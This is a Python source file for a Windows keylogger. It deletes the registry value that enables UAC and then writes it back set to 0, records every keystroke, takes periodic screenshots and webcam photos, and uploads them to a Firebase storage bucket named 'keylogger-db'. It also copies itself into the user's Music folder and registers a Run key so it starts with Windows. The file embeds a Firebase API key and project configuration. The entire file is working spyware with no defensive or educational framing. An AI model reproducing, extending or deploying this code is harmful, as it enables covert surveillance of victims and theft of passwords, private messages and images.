import ctypes
import getpass
import os
import shutil
import sys
import winreg
import cv2
from PIL import Image
import mss as mss
from pynput import keyboard, mouse
from datetime import datetime as date
import pyrebase
import win32com.shell.shell as win32shell
from pathlib import Path


def disable_UAC():
    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)


disable_UAC()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# if not is_admin():
    # Re-run the program with admin rights
    # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    # os._exit(1)

config = {
    'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
    'authDomain': "keylogger-db.firebaseapp.com",
    'databaseURL': "https://keylogger-db.firebaseio.com",
    'projectId': "keylogger-db",
    'storageBucket': "keylogger-db.appspot.com",
    'messagingSenderId': "282476825704",
    'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
    'measurementId': "G-TXMELPQRDB"
}
firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
today_date = full_currentTime.split(' ')[1]

f = open('data.txt', 'w', encoding='utf-8')

data = ''
lastThreeKeys = []
clicks_counter = 0
imgPath = 'screenshot.jpg'
pcName = os.environ['COMPUTERNAME']


def on_press(key):
    global lastThreeKeys, f
    if len(lastThreeKeys) == 3:
        lastThreeKeys = lastThreeKeys[1:]
    lastThreeKeys.append(str(key))

    try:
        if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
            f.close()

            storage.child(pcName + '/keylogs_' + today_date + '.txt') \
                .put('data.txt')

            # delete screenshot.jpg + data.txt
            os._exit(1)

        elif len(data) % 20 == 0:
            f.close()

            storage.child(pcName + '/keylogs_' + today_date + '.txt') \
                .put('data.txt')
            print('!')
            f = open('data.txt', 'a+', encoding='utf-8')
        printKey(key)
    except Exception as e:
        print(e)


def printKey(key):
    global data, f

    try:
        if str(key) == 'Key.enter':
            data += '\n'
            print('\n')
            f.write('\n')

        elif str(key) == 'Key.backspace' and len(data) > 0:
            data = data[:-1]
            f.close()
            f = open('data.txt', 'w', encoding='utf-8')
            f.write(data)

        elif str(key) == 'Key.space':
            data += ' '
            print(' ')
            f.write(' ')

        elif str(key) == 'Key.tab':
            data += '\t'
            print('\t')
            f.write('\t')

        elif hasattr(key, 'char'):
            data += key.char
            print(key.char)
            f.write(key.char)

    except Exception as e:
        print(e)


def on_click(x, y, button, pressed):
    global clicks_counter, full_currentTime, today_date

    clicks_counter += 1
    if clicks_counter == 40:
        # take screenshot and upload to firebase storage
        try:
            with mss.mss() as sct:
                sct.shot(output=imgPath)

                # try to save bitmap instead, or some other small size format of pics
                image = Image.open(imgPath)
                image = image.resize((1000, 562), Image.ANTIALIAS)
                image.save(imgPath, quality=50, optimize=True)

                storage.child(pcName +
                              '/screenshot_' + full_currentTime + '.jpg') \
                    .put(imgPath)
        except Exception as e:
            print(e)

    elif clicks_counter == 80:
        clicks_counter = 0
        try:
            vc = cv2.VideoCapture(0)
            if vc.isOpened():  # try to get the first frame
                success, frame = vc.read()
                while not success:
                    success, frame = vc.read()

            full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
            today_date = full_currentTime.split(' ')[1]

            cv2.imwrite('webcam_shot.jpg', frame)
            frame = Image.open('webcam_shot.jpg')
            frame = frame.resize((640, 480), Image.ANTIALIAS)
            frame.save('webcam_shot.jpg', quality=50, optimize=True)

            storage.child(pcName +
                          '/webcam_' + full_currentTime + '.jpg') \
                .put('webcam_shot.jpg')
        except Exception as e:
            print(e)


def addToStartup():
    try:
        home = str(Path.home())
        src = str(os.getcwd()) + '\\keylogger.exe'
        dst = home + '\\Music'
        shutil.copy2(src, dst)

        # dst = r'C:\WINDOWS\system32'
        # shutil.copy2(src, dst)

        exePath = home + '\\Music\\keylogger.exe'   # name of script after making EXE
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'keylogger', 0,
                          winreg.REG_SZ, exePath)  # file_path is path of file after coping it
    except:
        pass


addToStartup()

# Collect events of mouse clicks and keyboard keys
with keyboard.Listener(on_press=on_press) as k_listener, \
        mouse.Listener(on_click=on_click) as m_listener:
    k_listener.join()
    m_listener.join()